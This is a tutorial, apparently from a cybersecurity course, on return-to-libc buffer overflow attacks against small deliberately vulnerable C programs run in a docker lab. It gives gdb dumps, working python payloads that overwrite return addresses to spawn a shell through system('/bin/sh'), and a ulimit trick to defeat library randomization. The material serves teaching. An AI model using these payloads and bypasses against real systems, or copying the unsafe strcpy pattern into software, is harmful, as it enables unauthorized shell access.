# Return to `libc`

According to [4], a "return-to-libc" attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the NX bit feature (if present) and ridding the attacker of the need to inject their own code.

----

**Note**: as in previous tutorials, there's a docker container that facilitates reproducing the work of this tutorial. The container can be built with:
```bash
docker build -t basic_cybersecurity3:latest .
```
and runned with:
```bash
docker run --privileged -it basic_cybersecurity3:latest
```

----

### Finding a vulnerability, a simple overflow

We'll be using the following program named `rlibc1.c`:
```C
void not_called() {
    printf("Enjoy your shell!\n");
    system("/bin/bash");
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

Let's a get a bit more of information about the program structure in memory:
(*compiled with `-fno-stack-protector -z execstack` flags*)

```
>>> disas vulnerable_function
Dump of assembler code for function vulnerable_function:
   0x0804849d <+0>:	push   %ebp
   0x0804849e <+1>:	mov    %esp,%ebp
   0x080484a0 <+3>:	sub    $0x88,%esp
   0x080484a6 <+9>:	mov    0x8(%ebp),%eax
   0x080484a9 <+12>:	mov    %eax,0x4(%esp)
   0x080484ad <+16>:	lea    -0x6c(%ebp),%eax
   0x080484b0 <+19>:	mov    %eax,(%esp)
   0x080484b3 <+22>:	call   0x8048330 <strcpy@plt>
   0x080484b8 <+27>:	leave  
   0x080484b9 <+28>:	ret    
End of assembler dump.
>>> p not_called
$1 = {void ()} 0x804847d <not_called>
>>>
```

right before the call to `strcpy@plt`, the stack and registers looks like:
```
─── Memory ───────────────────────────────────────────────────────────────────────────────
            address buffer  address string
0xffffd750 [6c d7 ff ff] [ba d9 ff ff] 01 00 00 00 38 d9 ff f7 l...........8...
                                                buffer
0xffffd760 00 00 00 00 00 00 00 00 00 00 00 00 [00 00 00 00 ................
0xffffd770 03 00 00 00 09 00 00 00 3f 00 c0 03 00 00 00 00 .... ...?.......
0xffffd780 34 d8 ff ff a8 d7 ff ff a0 d7 ff ff 69 82 04 08 4...........i...
0xffffd790 38 d9 ff f7 00 00 00 00 c2 00 00 00 56 ad eb f7 8...........V...
0xffffd7a0 ff ff ff ff ce d7 ff ff 34 0c e3 f7 f3 72 e5 f7 ........4 ...r..
0xffffd7b0 00 00 00 00 00 00 c3 00 01 00 00 00 fd 82 04 08 ................
0xffffd7c0 a2 d9 ff ff 2f 00 00 00 00 a0 04 08 32 85 04 08] ..../.......2...
                                    ebp           ret
0xffffd7d0 02 00 00 00 94 d8 ff ff [f8 d7 ff ff] [d3 84 04 08] ................
            string
0xffffd7e0 [ba d9 ff ff] 00 d0 ff f7 eb 84 04 08 00 10 fd f7 ................
0xffffd7f0 e0 84 04 08 00 00 00 00 00 00 00 00 f3 da e3 f7 ................
0xffffd800 02 00 00 00 94 d8 ff ff a0 d8 ff ff 6a ae fe f7 ............j...
0xffffd810 02 00 00 00 94 d8 ff ff 34 d8 ff ff 1c a0 04 08 ........4.......
0xffffd820 3c 82 04 08 00 10 fd f7 00 00 00 00 00 00 00 00 <...............
0xffffd830 00 00 00 00 cd fd 26 9d dd 99 23 a5 00 00 00 00 ......&...#.....
0xffffd840 00 00 00 00 00 00 00 00 02 00 00 00 80 83 04 08 ................
─── Registers ────────────────────────────────────────────────────────────────────────────
   eax 0xffffd76c        ecx 0xa52399dd        edx 0xffffd824        ebx 0xf7fd1000    
   esp 0xffffd74c        ebp 0xffffd7d8        esi 0x00000000        edi 0x00000000    
   eip 0x08048330     eflags [ PF SF IF ]       cs 0x00000023         ss 0x0000002b    
    ds 0x0000002b         es 0x0000002b         fs 0x00000000         gs 0x00000063    
```
A different representation of the stack available at [3] is:
```
higher  | <arguments2>        |
address | <return address>    |
        | <old %ebp>          | <= %ebp
        | <0x6c bytes of      |
        |       ...           |
        |       buffer>       |
        | <arguments1>        |
lower   | <address of buffer> | <= %esp
```
Note that the starting of the stack has get filled with the parameters for the call to `strcpy` (`arguments2`).

Launching `./rlibc1_noprotection "$(python -c 'print "A"*0x6c + "BBBB" + "\x7d\x84\x04\x08"')"` we obtain:
```bash
Enjoy your shell!
root@44522cd9481b:~#
```

Of course, this is with the stack protection disabled, when compiling the program without disabling this protections, the program just crashes and we can't perform the buffer overflow.

```bash
root@3bf52dad8e1d:~# ./rlibc1 "$(python -c 'print "A"*0x6c + "BBBB" + "\x7d\x84\x04\x08"')"
*** stack smashing detected ***: ./rlibc1 terminated
Aborted
```

### Playing with arguments

Let's play with a slightly different program named `rlibc2.c`:
```C
char* not_used = "/bin/sh";

void not_called() {
    printf("Not quite a shell...\n");
    system("/bin/date");
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```
We debug the program to obtain information about the `system` call and the `not_used` variable:
```
>>> disassemble not_called
Dump of assembler code for function not_called:
   0x0804847d <+0>:	push   %ebp
   0x0804847e <+1>:	mov    %esp,%ebp
   0x08048480 <+3>:	sub    $0x18,%esp
   0x08048483 <+6>:	movl   $0x8048578,(%esp)
   0x0804848a <+13>:	call   0x8048340 <puts@plt>
   0x0804848f <+18>:	movl   $0x804858d,(%esp)
   0x08048496 <+25>:	call   0x8048350 <system@plt>
   0x0804849b <+30>:	leave  
   0x0804849c <+31>:	ret    
End of assembler dump.
>>> p not_used
$5 = 0x8048570 "/bin/sh"
```
The idea behind the exploit is to overflow the buffer with the `strcpy` call and modify the return address to point to the
 `system` call address with apprlibcriate parameters (not the default ones which will call `/bin/date`). The stack should look like:

 ```
| 0x8048570 <not_used>             |
| 0x43434343 <fake return address> |
| 0x8048350 <address of system>    |
| 0x42424242 <fake old %ebp>       |
| 0x41414141 ...                   |
|   ... (0x6c bytes of 'A's)       |
|   ... 0x41414141                 |
 ```

```bash
root@3bf52dad8e1d:~# ./rlibc2_noprotection "$(python -c 'print "A"*0x6c + "BBBB" + "\x50\x83\x04\x08" + "CCCC" + "\x70\x85\x04\x08"')"
#
```

(*note, while debugging and playing with the overflow, the following command allows to exit normally `gdb --args ./rlibc2_noprotection "$(python -c 'print "A"*0x6c + "\x78\xd7\xff\xff" + "\x50\x83\x04\x08" + "\xd3\x84\x04\x08" + "\x70\x85\x04\x08"')"`.*)


### Return to `libc` attack

From [3], the trick is to realize that programs that use functions from a shared library, like `printf` from `libc`, will link the entire library into their address space at run time. This means that even if they never call system, the code for system (and every other function in `libc`) is accessible at runtime. We can see this fairly easy in gdb:

```
>>> p system
$1 = {<text variable, no debug info>} 0x555be310 <__libc_system>
>>> find 0x555be310, +99999999, "/bin/sh"
0x556e0d4c
warning: Unable to access 16000 bytes of target memory at 0x5572ef54, halting search.
1 pattern found.
```
Now from gdb:
```
gdb --args rlibc2_noprotection "$(python -c 'print "A"*0x6c + "BBBB" + "\x10\xe3\x5b\x55" + "CCCC" + "\x4c\x0d\x6e\x55"')"
```
we'll get a shell. This however does not happen when launched directly from the command line due to ASLR [5]. To bypass this:
```
ulimit -s unlimited # from[3], disable library randomization on 32-bit programs
./rlibc2_noprotection "$(python -c 'print "A"*0x6c + "BBBB" + "\x10\xe3\x5b\x55" + "CCCC" + "\x4c\x0d\x6e\x55"')"
```

### Bibliography

- [1] M. Hicks (2014), *Software Security*, Coursera, Cybersecurity Specialization, University of Maryland, College Park, <https://www.coursera.org/learn/software-security>.
- [2] Hovav Shacham (2007), *The geometry of innocent flesh on the bone: return-into-libc without function calls (on the x86)*. In Proceedings of the 14th ACM conference on Computer and communications security (CCS '07). ACM, New York, NY, USA, 552-561. DOI: https://doi.org/10.1145/1315245.1315313
- [3] Alex Reece (2013). *Introduction to return oriented programming (ROP)*. Retrieved from http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html.
- [4] Wikipedia. *Return-to-libc attack*. Retrieved from https://en.wikipedia.org/wiki/Return-to-libc_attack.
- [5] Wikipedia. *Address space layout randomization*. Retrieved from https://en.wikipedia.org/wiki/Address_space_layout_randomization.
